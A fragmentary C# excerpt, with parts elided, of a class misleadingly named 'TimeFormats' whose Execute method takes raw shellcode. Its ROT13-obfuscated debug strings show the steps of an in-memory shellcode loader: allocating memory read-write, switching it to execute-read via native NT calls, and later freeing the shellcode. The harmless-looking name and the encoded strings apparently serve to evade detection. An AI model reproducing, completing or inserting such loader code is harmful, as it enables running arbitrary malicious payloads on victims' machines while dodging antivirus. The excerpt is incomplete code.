    ...
    class TimeFormats
    {
        public static void Execute(byte[] shellcode, bool debug = false)
        {
            ...
            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(GvzrSbezngf) [+] AgNyybpngrIveghnyZrzbel, CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
            ...
            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(GvzrSbezngf) [+] AgCebgrpgIveghnyZrzbel, CNTR_RKRPHGR_ERNQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
            ...
            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(GvzrSbezngf.PyrnaHc) [+] AgSerrIveghnyZrzbel, furyypbqr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
